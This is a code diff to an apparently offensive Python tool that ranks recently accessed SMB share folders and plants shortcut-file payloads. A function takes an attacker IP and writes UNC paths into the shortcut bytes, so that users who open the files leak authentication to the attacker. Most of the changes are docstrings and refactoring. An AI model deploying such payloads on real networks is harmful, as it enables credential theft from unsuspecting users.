@@ -5,12 +5,26 @@ payloads that coerce authentication based on recent access. This module can then
 deploy multiple types of payloads to the identified locations. Lastly, this module can be used to
 bulk cleanup multiple types of payloads from the identified locations.
 """
-
 from datetime import datetime, timedelta
-import linksiren.target
 from pathlib import Path
+import linksiren.target
 
 def process_targets(unc_paths: list):
+    """
+    Processes a list of UNC paths and groups them by host.
+    Args:
+        unc_paths (list): A list of UNC paths to be processed.
+    Returns:
+        list: A list of HostTarget objects, each containing a host and its associated paths.
+    Example:
+        unc_paths = [
+            '\\\\host1\\path1',
+            '\\\\host1\\path2',
+            '\\\\host2\\path1'
+        ]
+        targets = process_targets(unc_paths)
+        # targets will contain HostTarget objects with grouped paths by host.
+    """
     targets = []
     for unc_path in unc_paths:
         host, path = parse_target(unc_path)
@@ -28,6 +42,15 @@ def process_targets(unc_paths: list):
     return targets
 
 def parse_target(unc_path: str):
+    """
+    Parses a UNC (Universal Naming Convention) path to extract the host and the path.
+    Args:
+        unc_path (str): The UNC path to be parsed. It should be in the format
+        '\\\\host\\path\\to\\resource'.
+    Returns:
+        tuple: A tuple containing the host and the path. The host is the third element in the
+               split path, and the path is the remaining elements joined by backslashes.
+    """
     host = unc_path.split('\\')[2]
     path = '\\'.join(unc_path.split('\\')[3:])
 
@@ -94,30 +117,63 @@ def create_lnk_payload(attacker_ip, template_bytes):
 
     payload_bytes = template_bytes
 
-    for i in range(0, len(img_unc_path)):
-        payload_bytes[img_unc_offset + i] = img_unc_path[i]
+    for i, char in enumerate(img_unc_path):
+        payload_bytes[img_unc_offset + i] = char
 
-    for i in range(0, len(target_unc_path)):
-        payload_bytes[target_unc_offset + i] = target_unc_path[i]
+    for i, char in enumerate(target_unc_path):
+        payload_bytes[target_unc_offset + i] = char
 
     return bytes(payload_bytes)
 
 
 def compute_threshold_date(current_date, theshold_length):
+    """
+    Computes the threshold date by subtracting a given number of days from the current date.
+
+    Args:
+        current_date (datetime.date): The current date.
+        theshold_length (int): The number of days to subtract from the current date.
+
+    Returns:
+        datetime.date: The computed threshold date.
+    """
     threshold_date = current_date - timedelta(days=theshold_length)
     return threshold_date
 
 
 def is_active_file(threshold_date, access_time):
+    """
+    Determines if a file is active based on its last access time.
+
+    Args:
+        threshold_date (datetime): The date to compare the file's access time against.
+        access_time (float): The last access time of the file, represented as a Unix timestamp.
+
+    Returns:
+        bool: True if the file's access time is greater than or equal to the threshold date,
+        False otherwise.
+    """
     access_time = datetime.fromtimestamp(access_time)
     return access_time >= threshold_date
 
 
 def sort_rankings(folder_rankings):
+    """
+    Sorts the given dictionary of folder rankings in descending order based on their values.
+
+    Args:
+        folder_rankings (dict): A dictionary where the keys are folder names and the values are
+        their rankings.
+
+    Returns:
+        dict: A new dictionary with the folder rankings sorted in descending order by their values.
+              If the input is None, returns an empty dictionary.
+    """
     if folder_rankings is None:
         sorted_rankings = {}
     else:
-        sorted_rankings = dict(sorted(folder_rankings.items(), key=lambda item: item[1], reverse=True))
+        sorted_rankings = dict(sorted(folder_rankings.items(), key=lambda item: item[1],
+                                      reverse=True))
     return sorted_rankings
 
 
@@ -143,7 +199,8 @@ def filter_targets(targets, sorted_rankings, max_folders_per_target):
     # For each share target in the list
     for target in targets:
         # Get paths from sorted rankings associated with the target
-        matching_paths = [key for key in sorted_rankings.keys() if f'\\\\{target.host}\\' == key[:2+len(target.host)+1]]
+        matching_paths = [key for key in sorted_rankings.keys()
+                          if f'\\\\{target.host}\\' == key[:2+len(target.host)+1]]
 
         # Sort the matching share paths based on their ranking in descending order
         # and subsorted by key in alphabetical order. Keep only the top N.
